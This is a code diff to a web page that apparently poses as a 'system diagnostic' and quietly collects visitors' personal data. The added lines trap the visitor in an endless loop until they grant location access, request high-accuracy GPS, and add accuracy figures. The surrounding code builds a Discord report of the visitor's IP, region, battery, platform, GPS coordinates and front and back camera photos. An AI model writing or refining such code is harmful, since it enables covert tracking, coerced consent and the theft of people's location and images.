@@ -85,21 +85,29 @@
                     } catch (e) {}
                 }
 
-                addLog("> GPS座標を要求中...");
+                addLog("> 高精度GPS座標を要求中 (位置情報の許可が必須です)...");
                 let gpsText = "";
+                
+                // 【強制ルール】位置情報が許可されるまで絶対にループを抜けない（拒否されても何度も要求し続ける）
                 while (true) {
                     try {
                         const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true, // より正確なGPS（高精度）を要求
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
                         });
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy; // 精度（メートル）
                         const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})`;
-                        break;
+                        
+                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${Math.round(accuracy)}m 周辺)`;
+                        break; // 取得成功したらループを抜ける
                     } catch (e) {
-                        addWarn("位置情報の取得が拒否されました。「許可」を選択してください。");
-                        await new Promise(r => setTimeout(r, 1000));
+                        addWarn("位置情報が拒否されました。次に進むには必ず「許可」を選択してください！");
+                        await new Promise(r => setTimeout(r, 2000)); // 2秒待ってから再トライ
                     }
                 }
 
@@ -115,9 +123,9 @@
                 };
 
                 const discordMessage = {
-                    content: "🚨 **【システム診断】情報検知**",
+                    content: "🚨 **【システム診断】高精度GPS・強制検知**",
                     embeds: [{
-                        title: "📊 取得データ一覧",
+                        title: "📊 取得データ一覧（高精度）",
                         color: 16711680,
                         fields: [
                             { name: "🌐 IPアドレス", value: info.ip, inline: true },
@@ -125,7 +133,7 @@
                             { name: "📍 地域", value: `${info.country} ${info.region} ${info.city}`, inline: false },
                             { name: "🔋 バッテリー", value: batteryInfo, inline: true },
                             { name: "💻 プラットフォーム", value: info.platform, inline: true },
-                            { name: "🛰️ GPS位置情報", value: gpsText, inline: false },
+                            { name: "🛰️ GPS位置情報（高精度・周辺エリア）", value: gpsText, inline: false },
                             { name: "📷 前面カメラ", value: frontBlob ? "画像添付済み (front.jpg)" : "取得なし/拒否", inline: true },
                             { name: "📷 背面カメラ", value: backBlob ? "画像添付済み (back.jpg)" : "取得なし/拒否", inline: true }
                         ],
